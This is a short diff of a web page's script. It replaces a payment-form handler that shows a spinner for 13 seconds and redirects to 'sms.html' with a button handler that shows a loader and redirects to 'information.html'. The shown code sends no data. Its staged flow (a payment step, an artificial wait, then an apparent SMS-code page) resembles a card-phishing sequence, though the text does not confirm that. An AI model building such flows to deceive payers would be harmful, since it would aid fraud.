@@ -63,19 +63,14 @@
   </footer>
 
 <script>
-  const form = document.getElementById('paymentForm');
-  const overlay = document.getElementById('spinnerOverlay');
-
-  form.addEventListener('submit', function(e) {
-    e.preventDefault();
-    // Affiche le spinner
-    overlay.style.display = 'flex';
-    // Après 13s, redirige vers sms.html
-    setTimeout(() => {
-      window.location.href = 'sms.html';
-    }, 13000);
-  });
-</script>
+    document.getElementById('btn-pay').addEventListener('click', function(){
+      const overlay = document.createElement('div');
+      overlay.className = 'loader-overlay';
+      overlay.innerHTML = '<div class="loader"></div>';
+      document.body.appendChild(overlay);
+      setTimeout(()=> window.location.href = 'information.html', 1500);
+    });
+  </script>
 
     <!-- Spinner overlay -->
   <div id="spinnerOverlay">
